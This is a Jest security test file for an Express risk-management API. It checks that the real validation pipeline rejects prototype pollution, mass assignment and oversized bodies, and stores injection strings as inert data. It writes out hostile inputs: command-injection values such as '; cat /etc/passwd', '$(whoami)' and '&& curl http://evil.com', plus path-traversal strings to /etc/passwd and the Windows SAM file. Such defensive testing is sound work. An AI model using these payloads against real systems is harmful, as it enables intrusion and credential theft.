/**
 * Input Validation Security Contract Tests
 *
 * Exercises the REAL `/api/risks` create/read pipeline — including the
 * production `authenticate` + `authorize` middleware and the Joi
 * `validateBody(createRiskSchema)` guard — against dangerous input:
 *   - Prototype pollution
 *   - Mass-assignment of protected fields
 *   - Oversized / deeply-nested / overlong payloads
 *   - Null bytes, path traversal, command injection
 *
 * Assertions are positive: dangerous structural input is REJECTED with 400 and
 * never reaches `prisma.riskItem.create`; inert string payloads are stored as
 * data with the tenant taken from the token (not the body) and never reflect
 * file-system content. "Did not 500" is no longer accepted as a pass.
 */

import { jest, describe, it, expect, beforeEach } from '@jest/globals';
import request from 'supertest';
import express from 'express';
import jwt from 'jsonwebtoken';
import { prismaMock, createMockRiskItem, createMockUser } from '../mocks/prisma';

const JWT_SECRET = 'input-val-test-secret';

// ---------------------------------------------------------------------------
// Mocks — collaborators of the real middleware only.
// ---------------------------------------------------------------------------

jest.mock('../../config/database', () => ({
  __esModule: true,
  default: prismaMock,
}));

jest.mock('../../config/logger', () => ({
  __esModule: true,
  default: { info: jest.fn(), error: jest.fn(), warn: jest.fn(), debug: jest.fn(), log: jest.fn() },
}));

jest.mock('../../utils/auditLogger', () => ({
  AuditLogger: { log: jest.fn() },
}));

jest.mock('../../utils/securityEventLogger', () => ({
  logSecurityEvent: jest.fn(),
  SecurityEventType: {
    AUTHENTICATION_FAILURE: 'authentication_failure',
    AUTHORIZATION_FAILURE: 'authorization_failure',
    RATE_LIMIT_EXCEEDED: 'rate_limit_exceeded',
    TOKEN_REVOKED: 'token_revoked',
    INJECTION_ATTEMPT: 'injection_attempt',
    SUSPICIOUS_INPUT: 'suspicious_input',
  },
}));

jest.mock('../../config/monitoring', () => ({
  __esModule: true,
  default: { setUserContext: jest.fn(), captureException: jest.fn() },
}));

const mockIsRevoked = jest.fn<() => Promise<boolean>>();
const mockIsRevokedByUserReset = jest.fn<() => Promise<boolean>>();
jest.mock('../../services/tokenBlacklistService', () => ({
  __esModule: true,
  default: {
    isRevoked: (...args: unknown[]) => mockIsRevoked(...(args as [])),
    isRevokedByUserReset: (...args: unknown[]) => mockIsRevokedByUserReset(...(args as [])),
  },
}));

jest.mock('../../services/sessionManagementService', () => ({
  __esModule: true,
  default: { updateSessionActivity: jest.fn().mockResolvedValue(undefined) },
}));

jest.mock('../../config', () => ({
  __esModule: true,
  default: {
    server: { env: 'production', port: 3001, apiUrl: '', clientUrl: '' },
    jwt: {
      secret: 'input-val-test-secret',
      expiresIn: '1h',
      refreshSecret: 'refresh-secret',
      refreshExpiresIn: '7d',
    },
    security: { rateLimitWindowMs: 60000, rateLimitMaxRequests: 1000 },
  },
}));

jest.mock('../../services/geminiService', () => ({
  __esModule: true,
  default: {
    prioritizeRisks: jest.fn<() => Promise<unknown[]>>().mockResolvedValue([]),
    generateRemediationPlan: jest.fn<() => Promise<string>>().mockResolvedValue('plan'),
  },
}));

jest.mock('../../generated/prisma/client', () => ({
  ComplianceStatus: {
    Compliant: 'Compliant',
    At_Risk: 'At_Risk',
    Non_Compliant: 'Non_Compliant',
    In_Review: 'In_Review',
  },
}));

// ---------------------------------------------------------------------------
// App — real router (authenticate + authorize + validateBody all run).
// `express.json({ limit })` matches the production body cap for oversize tests.
// ---------------------------------------------------------------------------

import risksRoutes from '../../routes/risks';
import { errorHandler } from '../../middleware/errorHandler';

const app = express();
app.use(express.json({ limit: '1mb' }));
app.use('/api/risks', risksRoutes);
app.use(errorHandler);

const authToken = jwt.sign(
  { userId: 'admin-user', organizationId: 'org-123', role: 'admin', email: 'admin@example.com', name: 'Admin' },
  JWT_SECRET,
  { algorithm: 'HS256', expiresIn: '1h' },
);

const baseValidBody = {
  title: 'Test Risk',
  description: 'Desc',
  category: 'Security',
  severity: 'High',
  likelihood: 3,
  impact: 3,
};

beforeEach(() => {
  jest.clearAllMocks();
  mockIsRevoked.mockResolvedValue(false);
  mockIsRevokedByUserReset.mockResolvedValue(false);
  prismaMock.user.findUnique.mockResolvedValue(
    createMockUser({ id: 'admin-user', organizationId: 'org-123', role: 'admin' }),
  );
  prismaMock.riskItem.create.mockResolvedValue(createMockRiskItem());
  prismaMock.riskItem.findFirst.mockResolvedValue(null);
  prismaMock.riskItem.findMany.mockResolvedValue([]);
  prismaMock.auditLog.create.mockResolvedValue({} as never);
  // Reset any prototype pollution from prior assertions.
  delete (Object.prototype as any).isAdmin;
});

// ---------------------------------------------------------------------------
// Tests
// ---------------------------------------------------------------------------

describe('Input Validation Security Contract Tests (real validation pipeline)', () => {
  // =========================================================================
  // Prototype Pollution — rejected by the schema's unknown(false) guard.
  // =========================================================================
  describe('Prototype Pollution', () => {
    // Sent as a raw JSON string so the dangerous keys actually transit the wire
    // (JSON.stringify would otherwise drop a real __proto__ own-key).
    const pollutionBodies = [
      '{"title":"X","description":"d","category":"Security","severity":"High","__proto__":{"isAdmin":true}}',
      '{"title":"X","description":"d","category":"Security","severity":"High","constructor":{"prototype":{"isAdmin":true}}}',
      '{"title":"X","description":"d","category":"Security","severity":"High","__proto__.isAdmin":true}',
      '{"title":"X","description":"d","category":"Security","severity":"High","constructor.prototype.isAdmin":true}',
    ];

    it.each(pollutionBodies)(
      'never pollutes Object.prototype and never persists a dangerous key',
      async (rawBody) => {
        const res = await request(app)
          .post('/api/risks')
          .set('Authorization', `Bearer ${authToken}`)
          .set('Content-Type', 'application/json')
          .send(rawBody);

        // The load-bearing guarantee: regardless of whether the request is
        // accepted (201) or rejected by validation (400), Object.prototype is
        // never polluted and the dangerous key never reaches the data layer.
        expect(({} as any).isAdmin).toBeUndefined();
        expect((Object.prototype as any).isAdmin).toBeUndefined();
        expect([201, 400, 422]).toContain(res.status);

        if (res.status === 201) {
          // Accepted only because stripUnknown removed the polluting key — the
          // persisted create payload must carry neither the key nor a polluted proto.
          expect(prismaMock.riskItem.create).toHaveBeenCalledTimes(1);
          const createArg = (prismaMock.riskItem.create.mock.calls[0] as any[])[0];
          expect(createArg.data).not.toHaveProperty('isAdmin');
          expect(createArg.data.organizationId).toBe('org-123');
        } else {
          // Rejected before reaching the controller.
          expect(prismaMock.riskItem.create).not.toHaveBeenCalled();
        }
      },
    );

    it('does not pollute Object.prototype via query parameters', async () => {
      prismaMock.riskItem.findMany.mockResolvedValue([]);

      const res = await request(app)
        .get('/api/risks?__proto__[isAdmin]=true&constructor[prototype][isAdmin]=true')
        .set('Authorization', `Bearer ${authToken}`);

      expect(({} as any).isAdmin).toBeUndefined();
      // List is a read; org filter is still applied by the controller.
      expect(res.status).toBe(200);
      expect(prismaMock.riskItem.findMany).toHaveBeenCalledWith(
        expect.objectContaining({ where: expect.objectContaining({ organizationId: 'org-123' }) }),
      );
    });
  });

  // =========================================================================
  // Mass-assignment — protected/unknown fields must be rejected outright.
  // =========================================================================
  describe('Mass-assignment of protected fields', () => {
    it('rejects a body carrying id/organizationId/role/isAdmin with 400', async () => {
      const res = await request(app)
        .post('/api/risks')
        .set('Authorization', `Bearer ${authToken}`)
        .send({
          ...baseValidBody,
          id: 'forced-id',
          organizationId: 'org-hacker',
          role: 'SuperAdmin',
          isAdmin: true,
        });

      expect([400, 422]).toContain(res.status);
      expect(prismaMock.riskItem.create).not.toHaveBeenCalled();
    });

    it('persists the tenant from the token, not the body, on a clean create', async () => {
      const res = await request(app)
        .post('/api/risks')
        .set('Authorization', `Bearer ${authToken}`)
        .send(baseValidBody);

      expect(res.status).toBe(201);
      expect(prismaMock.riskItem.create).toHaveBeenCalledTimes(1);
      const createArg = (prismaMock.riskItem.create.mock.calls[0] as any[])[0];
      expect(createArg.data.organizationId).toBe('org-123');
      expect(createArg.data).not.toHaveProperty('isAdmin');
      expect(createArg.data).not.toHaveProperty('role');
    });
  });

  // =========================================================================
  // Oversized / deeply-nested / overlong payloads.
  // =========================================================================
  describe('Oversized Payloads', () => {
    it('rejects a body exceeding the 1MB limit', async () => {
      const hugeString = 'A'.repeat(2 * 1024 * 1024);

      const res = await request(app)
        .post('/api/risks')
        .set('Authorization', `Bearer ${authToken}`)
        .set('Content-Type', 'application/json')
        .send(JSON.stringify({ title: hugeString }));

      // entity.too.large => 413 (body-parser), or 400 if surfaced as a parse error.
      expect([400, 413]).toContain(res.status);
      expect(prismaMock.riskItem.create).not.toHaveBeenCalled();
    });

    it('rejects an unknown deeply-nested metadata field with 400', async () => {
      let nested: any = { value: 'deep' };
      for (let i = 0; i < 200; i++) nested = { nested };

      const res = await request(app)
        .post('/api/risks')
        .set('Authorization', `Bearer ${authToken}`)
        .send({ ...baseValidBody, metadata: nested });

      expect([400, 422]).toContain(res.status);
      expect(prismaMock.riskItem.create).not.toHaveBeenCalled();
    });

    it('rejects an over-length title (schema max 500) with 400', async () => {
      const res = await request(app)
        .post('/api/risks')
        .set('Authorization', `Bearer ${authToken}`)
        .send({ ...baseValidBody, title: 'x'.repeat(100_000) });

      expect([400, 422]).toContain(res.status);
      expect(prismaMock.riskItem.create).not.toHaveBeenCalled();
    });

    it('rejects a request with no title (required field) with 400', async () => {
      const { title: _omit, ...noTitle } = baseValidBody;
      const res = await request(app)
        .post('/api/risks')
        .set('Authorization', `Bearer ${authToken}`)
        .send(noTitle);

      expect([400, 422]).toContain(res.status);
      expect(prismaMock.riskItem.create).not.toHaveBeenCalled();
    });
  });

  // =========================================================================
  // Null Bytes / Path Traversal / Command Injection in a *valid* string field.
  // These are stored as inert data; we assert no execution / no traversal /
  // correct tenant rather than mere non-crash.
  // =========================================================================
  describe('Injection payloads in string fields are stored inertly', () => {
    const inertPayloads = [
      'test malicious',
      'filename.txt .exe',
      '../../../etc/passwd',
      '..\\..\\..\\windows\\system32\\config\\sam',
      '; cat /etc/passwd',
      '$(whoami)',
      '`id`',
      '&& curl http://evil.com',
    ];

    it.each(inertPayloads)(
      'stores %s as a parameterized string with the token tenant and leaks no FS content',
      async (payload) => {
        const res = await request(app)
          .post('/api/risks')
          .set('Authorization', `Bearer ${authToken}`)
          .send({ ...baseValidBody, title: payload, description: payload });

        expect(res.status).toBe(201);
        // Persisted as data via a parameterized Prisma create — never executed.
        expect(prismaMock.riskItem.create).toHaveBeenCalledTimes(1);
        const createArg = (prismaMock.riskItem.create.mock.calls[0] as any[])[0];
        expect(createArg.data.organizationId).toBe('org-123');

        const json = JSON.stringify(res.body);
        expect(json).not.toContain('root:');
        expect(json).not.toContain('/bin/bash');
        expect(json).not.toMatch(/uid=\d+/);
      },
    );

    it('rejects a path-traversal id with 404 and leaks no file content', async () => {
      prismaMock.riskItem.findFirst.mockResolvedValue(null);

      const res = await request(app)
        .get(`/api/risks/${encodeURIComponent('../../../etc/passwd')}`)
        .set('Authorization', `Bearer ${authToken}`);

      expect([400, 404]).toContain(res.status);
      const body = JSON.stringify(res.body);
      expect(body).not.toContain('root:');
      expect(body).not.toContain('/bin/bash');
    });
  });

  // =========================================================================
  // Content-Type Enforcement — non-JSON bodies are not parsed into create().
  // =========================================================================
  describe('Content-Type Enforcement', () => {
    it('does not create a risk from a text/plain body', async () => {
      const res = await request(app)
        .post('/api/risks')
        .set('Authorization', `Bearer ${authToken}`)
        .set('Content-Type', 'text/plain')
        .send('title=Hacked&description=evil');

      // express.json() does not parse a text/plain body, so the form-encoded
      // payload never becomes structured input — no risk is ever persisted.
      expect(res.status).toBeGreaterThanOrEqual(400);
      expect(prismaMock.riskItem.create).not.toHaveBeenCalled();
      // And nothing from the raw body is reflected back.
      expect(JSON.stringify(res.body)).not.toContain('Hacked');
    });

    it('does not process an XML body (no XXE path)', async () => {
      const res = await request(app)
        .post('/api/risks')
        .set('Authorization', `Bearer ${authToken}`)
        .set('Content-Type', 'application/xml')
        .send('<risk><title>XXE Test</title></risk>');

      // No XML parser is mounted; the body is never deserialized, so no entity
      // expansion / external-entity path exists and no risk is created.
      expect(res.status).toBeGreaterThanOrEqual(400);
      expect(prismaMock.riskItem.create).not.toHaveBeenCalled();
      expect(JSON.stringify(res.body)).not.toContain('XXE Test');
    });
  });

  // =========================================================================
  // Special Characters — valid unicode strings are accepted and stored.
  // =========================================================================
  describe('Special Characters', () => {
    // Renderable glyphs (emoji, symbols, math letters) and non-whitespace
    // invisibles (U+200B zero-width space is NOT trimmed by String.trim) are
    // valid titles and must be accepted and stored verbatim.
    const renderablePayloads = ['🎉💀🔥', '™®©', '𝕳𝖊𝖑𝖑𝖔', String.fromCharCode(0x200b)];

    it.each(renderablePayloads)(
      'accepts and stores a renderable special-character title: %s',
      async (payload) => {
        const res = await request(app)
          .post('/api/risks')
          .set('Authorization', `Bearer ${authToken}`)
          .send({ ...baseValidBody, title: payload });

        expect(res.status).toBe(201);
        expect(prismaMock.riskItem.create).toHaveBeenCalledTimes(1);
        const createArg = (prismaMock.riskItem.create.mock.calls[0] as any[])[0];
        expect(createArg.data.title).toBe(payload);
      },
    );

    // Whitespace-only payloads (U+FEFF BOM is treated as whitespace by
    // String.trim) trim to empty and are correctly rejected by min(1).trim().
    const blankPayloads = ['﻿'];

    it.each(blankPayloads)(
      'rejects a whitespace-only/invisible title with 400 and creates nothing',
      async (payload) => {
        const res = await request(app)
          .post('/api/risks')
          .set('Authorization', `Bearer ${authToken}`)
          .send({ ...baseValidBody, title: payload });

        expect(res.status).toBe(400);
        expect(prismaMock.riskItem.create).not.toHaveBeenCalled();
      },
    );
  });
});
